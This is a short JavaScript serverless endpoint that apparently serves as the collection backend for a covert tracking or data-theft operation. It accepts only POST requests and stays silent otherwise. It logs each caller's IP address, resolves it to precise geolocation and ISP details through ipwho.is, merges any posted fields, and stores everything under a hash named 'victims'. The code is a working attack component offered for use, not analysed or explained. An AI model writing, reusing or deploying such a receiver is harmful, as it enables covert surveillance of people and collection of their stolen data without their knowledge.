const { kv } = require('@vercel/kv');

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(404).end();
  }
  try {
    const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '0.0.0.0').split(',')[0].trim();
    const body = (req.body && typeof req.body === 'object') ? req.body : {};
    const id = String(body.x || '').slice(0, 40);
    if (!id) {
      return res.status(204).end();
    }

    let geo = null;
    try {
      geo = await kv.get('geo:' + ip);
      if (typeof geo === 'string') geo = JSON.parse(geo);
    } catch (e) { geo = null; }

    if (!geo) {
      geo = await lookupGeo(ip);
      if (geo) {
        try { await kv.set('geo:' + ip, JSON.stringify(geo), { ex: geo.err ? 3600 : 604800 }); } catch (e) {}
      }
    }

    let prev = {};
    try {
      const raw = await kv.hget('victims', id);
      if (raw) prev = JSON.parse(raw);
    } catch (e) {}

    const rec = Object.assign({}, prev, body, {
      t: new Date().toISOString(),
      ip,
      geo: geo || null
    });

    try {
      const fields = {};
      fields[id] = JSON.stringify(rec);
      await kv.hset('victims', fields);
    } catch (e) {}

    return res.status(204).end();
  } catch (e) {
    return res.status(204).end();
  }
};

async function lookupGeo(ip) {
  if (!ip || ip === '0.0.0.0' || ip.startsWith('10.') || ip.startsWith('127.') || ip.startsWith('192.168.')) return null;
  try {
    const r = await fetch('https://ipwho.is/' + ip);
    const j = await r.json();
    if (!j || j.success === false) return { err: 1 };
    return {
      lat: j.latitude !== undefined ? j.latitude : null,
      lon: j.longitude !== undefined ? j.longitude : null,
      city: j.city || '',
      region: j.region || '',
      country: j.country || '',
      zip: j.postal || '',
      isp: j.connection && j.connection.isp || '',
      org: j.connection && j.connection.org || '',
      asn: j.connection && j.connection.asn || ''
    };
  } catch (e) {
    return { err: 1 };
  }
}
